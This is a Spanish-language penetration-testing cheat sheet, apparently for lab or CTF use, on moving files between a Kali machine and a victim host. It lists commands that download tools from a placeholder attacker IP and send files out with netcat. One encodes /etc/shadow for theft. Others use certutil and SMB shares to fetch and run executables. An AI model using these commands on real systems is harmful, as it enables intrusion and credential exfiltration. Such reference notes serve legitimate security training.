# Transferencia de Archivos

## Descripción

Métodos para pasar archivos entre Kali y la máquina víctima. Útil para subir exploits, herramientas de enumeración o bajar archivos de la víctima.

---

## De Kali → Víctima (subir archivos)

### Método 1 — Servidor HTTP con Python (el más usado) 

```shell
# En Kali — levantar servidor en el directorio con los archivos
cd /directorio/con/archivos
python3 -m http.server 8080

# En la víctima — descargar
wget http://KALI_IP:8080/archivo.sh
curl http://KALI_IP:8080/archivo.sh -o archivo.sh
```

### Método 2 — SCP (si tienes SSH)

```shell
# De Kali a víctima
scp /ruta/local/archivo.sh usuario@TARGET_IP:/tmp/archivo.sh

# De víctima a Kali
scp usuario@TARGET_IP:/ruta/archivo /ruta/local/
```

### Método 3 — Netcat

```shell
# En la víctima — escuchar y recibir
nc -lvnp 4444 > archivo_recibido

# En Kali — enviar
nc TARGET_IP 4444 < archivo_a_enviar
```

### Método 4 — Base64 (cuando no hay wget ni curl)

```shell
# En Kali — codificar el archivo
base64 archivo.sh

# Copiar la salida y en la víctima:
echo "BASE64_STRING" | base64 -d > archivo.sh
chmod +x archivo.sh
```

### Método 5 — Servidor FTP con Python

```shell
# En Kali
python3 -m pyftpdlib -p 21

# En la víctima
ftp KALI_IP
# usuario: anonymous, contraseña: vacía
get archivo.sh
```

---

## De Víctima → Kali (bajar archivos)

### Método 1 — Netcat ⭐

```shell
# En Kali — escuchar y guardar
nc -lvnp 4444 > archivo_recibido

# En la víctima — enviar
nc KALI_IP 4444 < /ruta/al/archivo
```

### Método 2 — SCP

```shell
scp usuario@TARGET_IP:/ruta/archivo /ruta/local/kali/
```

### Método 3 — Servidor HTTP en la víctima

```shell
# En la víctima (si tiene Python)
python -m SimpleHTTPServer 8080    # Python 2
python3 -m http.server 8080        # Python 3

# En Kali
wget http://TARGET_IP:8080/archivo
```

### Método 4 — Base64

```shell
# En la víctima
base64 /etc/shadow

# Copiar la salida y en Kali:
echo "BASE64_STRING" | base64 -d > shadow
```

---

## Windows — De Kali → Víctima

### Método 1 — Servidor HTTP + PowerShell 

```shell
# En Kali
python3 -m http.server 8080

# En la víctima (PowerShell)
Invoke-WebRequest -Uri http://KALI_IP:8080/archivo.exe -OutFile C:\Windows\Temp\archivo.exe

# O más corto
iwr http://KALI_IP:8080/archivo.exe -o C:\Windows\Temp\archivo.exe
```

### Método 2 — certutil (siempre disponible en Windows)

```shell
certutil.exe -urlcache -split -f http://KALI_IP:8080/archivo.exe C:\Windows\Temp\archivo.exe
```

### Método 3 — Servidor SMB con Impacket

```shell
# En Kali — levantar servidor SMB
impacket-smbserver share /directorio/con/archivos -smb2support

# En la víctima
copy \\KALI_IP\share\archivo.exe C:\Windows\Temp\
# O ejecutar directamente desde el share
\\KALI_IP\share\archivo.exe
```

---

## Tabla resumen rápida

| Situación | Método recomendado |
|-----------|-------------------|
| Linux víctima con wget/curl | Servidor HTTP Python |
| Linux víctima sin herramientas | Base64 copy-paste |
| Windows víctima con PowerShell | iwr + servidor HTTP Python |
| Windows víctima sin PS | certutil |
| Bajar archivo de la víctima | Netcat |
| Tienes credenciales SSH | SCP |

---

## Preparar herramientas habituales en Kali

Tener siempre en `/tmp` listo para servir:

```shell
# Descargar LinPEAS y WinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -O /tmp/winpeas.exe

# PrintSpoofer para Windows SeImpersonatePrivilege
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe -O /tmp/PrintSpoofer64.exe
```
